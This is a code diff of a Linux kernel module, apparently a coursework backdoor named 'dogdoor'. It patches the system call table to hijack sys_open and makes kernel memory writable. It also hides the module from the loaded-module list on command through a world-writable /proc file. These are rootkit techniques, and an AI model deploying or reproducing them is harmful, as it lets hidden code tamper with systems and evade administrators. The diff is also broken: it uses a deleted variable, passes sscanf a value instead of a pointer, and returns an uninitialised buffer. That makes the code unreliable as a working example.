@@ -13,16 +13,15 @@ MODULE_LICENSE("GPL");
 
 struct list_head modules_list;
 struct list_head* p;
-struct list_head* n;
 
-char filepath[128] = { 0x0, } ;
+//char line[128] = { 0x0, } ;
+int index=0;
 void ** sctable ;
-int count = 0 ;
 int connect = 1;
 
 asmlinkage int (*orig_sys_open)(const char __user * filename, int flags, umode_t mode) ; 
 
-asmlinkage int openhook_sys_open(const char __user * filename, int flags, umode_t mode)
+asmlinkage int dogdoor_sys_open(const char __user * filename, int flags, umode_t mode)
 {
 	char fname[256] ;
 	int result, result2;
@@ -33,13 +32,7 @@ asmlinkage int openhook_sys_open(const char __user * filename, int flags, umode_
 	
 	
 	if (filepath[0] != 0x0 && strcmp(filepath, fname) == 0) {
-		count++ ;
-		if(connect == 0){
-    			list_add(&THIS_MODULE->list, p); //add to procfs
-			connect = 1;
-			printk("connect\n");
-
-		}
+		
 		return -1 ;
 	}
 	return orig_sys_open(filename, flags, mode) ;
@@ -47,27 +40,39 @@ asmlinkage int openhook_sys_open(const char __user * filename, int flags, umode_
 
 
 static 
-int openhook_proc_open(struct inode *inode, struct file *file) {
+int dogdoor_proc_open(struct inode *inode, struct file *file) {
 	return 0 ;
 }
 
 static 
-int openhook_proc_release(struct inode *inode, struct file *file) {
+int dogdoor_proc_release(struct inode *inode, struct file *file) {
 	return 0 ;
 }
 
+
 static
-ssize_t openhook_proc_read(struct file *file, char __user *ubuf, size_t size, loff_t *offset) 
+void fun3(){
+	if(connect==1){
+		list_del_init(&modules_list); 
+		connect = 0;
+		printk("disconnect\n");
+	}else{
+		list_add(&THIS_MODULE->list, p); 
+		connect = 1;
+		printk("connect\n");
+	}	
+	
+}
+	
+static
+ssize_t dogdoor_proc_read(struct file *file, char __user *ubuf, size_t size, loff_t *offset) 
 {
 	char buf[256] ;
 	ssize_t toread ;
-	if(connect==1){
-		list_del_init(&modules_list); 
-		printk("disconnect\n");
-		connect = 0;
+	
+	if(index==3){
+		fun3();
 	}
-
-	sprintf(buf, "%s:%d\n", filepath, count) ;
 	
 
 	toread = strlen(buf) >= *offset + size ? size : strlen(buf) - *offset ;
@@ -80,8 +85,9 @@ ssize_t openhook_proc_read(struct file *file, char __user *ubuf, size_t size, lo
 	return toread ;
 }
 
+
 static 
-ssize_t openhook_proc_write(struct file *file, const char __user *ubuf, size_t size, loff_t *offset) 
+ssize_t dogdoor_proc_write(struct file *file, const char __user *ubuf, size_t size, loff_t *offset) 
 {
 	char buf[128] ;
 
@@ -90,58 +96,52 @@ ssize_t openhook_proc_write(struct file *file, const char __user *ubuf, size_t s
 
 	if (copy_from_user(buf, ubuf, size))
 		return -EFAULT ;
-
-	sscanf(buf,"%s", filepath) ;
-	count = 0 ;
+	
+	sscanf(buf,"%d", index) ;
+	printk("index : %d\n", index);	
 	*offset = strlen(buf) ;
 
 	return *offset ;
 }
 
-static const struct file_operations openhook_fops = {
+static const struct file_operations dogdoor_fops = {
 	.owner = 	THIS_MODULE,
-	.open = 	openhook_proc_open,
-	.read = 	openhook_proc_read,
-	.write = 	openhook_proc_write,
+	.open = 	dogdoor_proc_open,
+	.read = 	dogdoor_proc_read,
+	.write = 	dogdoor_proc_write,
 	.llseek = 	seq_lseek,
-	.release = 	openhook_proc_release,
+	.release = 	dogdoor_proc_release,
 } ;
 
 static 
-int __init openhook_init(void) {
+int __init dogdoor_init(void) {
 	
-
 	unsigned int level ; 
 	pte_t * pte ;
-
-
-	proc_create("openhook", S_IRUGO | S_IWUGO, NULL, &openhook_fops) ;
-	
+	proc_create("dogdoor", S_IRUGO | S_IWUGO, NULL, &dogdoor_fops) ;
   	modules_list = THIS_MODULE->list;
 	p = (&modules_list)->prev;
-	pr_info("name    = %s\n", THIS_MODULE->name);
-    	pr_info("version = %s\n", THIS_MODULE->version);
 	sctable = (void *) kallsyms_lookup_name("sys_call_table") ;
-	
+
 	orig_sys_open = sctable[__NR_open] ;
 	pte = lookup_address((unsigned long) sctable, &level) ;
 	if (pte->pte &~ _PAGE_RW) 
 		pte->pte |= _PAGE_RW ;		
-	sctable[__NR_open] = openhook_sys_open ;
+	sctable[__NR_open] = dogdoor_sys_open ;
 
 	return 0;
 }
 
 static 
-void __exit openhook_exit(void) {
+void __exit dogdoor_exit(void) {
 	unsigned int level ;
 	pte_t * pte ;
-	remove_proc_entry("openhook", NULL) ;
+	remove_proc_entry("dogdoor", NULL) ;
 
 	sctable[__NR_open] = orig_sys_open ;
 	pte = lookup_address((unsigned long) sctable, &level) ;
 	pte->pte = pte->pte &~ _PAGE_RW ;
 }
 
-module_init(openhook_init);
-module_exit(openhook_exit);
+module_init(dogdoor_init);
+module_exit(dogdoor_exit);
